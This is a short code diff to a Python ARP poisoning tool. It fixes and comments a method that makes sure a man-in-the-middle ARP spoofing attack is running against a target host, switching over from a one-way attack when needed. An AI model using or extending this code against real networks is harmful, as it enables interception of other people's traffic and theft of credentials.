@@ -36,9 +36,31 @@ class Host():
         self.arp_poisoner.add_packet(other_mac, gateway_mac, self.ip, gateway_ip)
         self.arp_attack = "mitm"
 
-    def ensure_mitm(self, gateway_ip, gateway_mac, other_mac)
+    # ensure that mitm arp poisoning attack is running against this host
+    def arp_ensure_mitm(self, gateway_ip, gateway_mac, other_mac):
 
-        if self.arp_poisoner.ist_alive()
+        # if attack is currently running
+        if self.arp_poisoner.is_alive():
+
+            # mitm attack is already running, so do nothing
+            if self.arp_attack == "mitm":
+                pass
+
+            # one-way attack is running, so stop it and run mitm attack instead
+            else:
+                self.arp_stop()
+                self.arp_mitm(gateway_ip, gateway_mac, other_mac)
+                self.arp_start()
+
+        else:
+
+            # mitm attack is prepared but not running, so just start it
+            if self.arp_attack == "mitm":
+                self.arp_start()
+
+            else:
+                self.arp_mitm(gateway_ip, gateway_mac, other_mac)
+                self.arp_start()
 
     # starts currently prepared arp poisoning attack
     def arp_start(self):
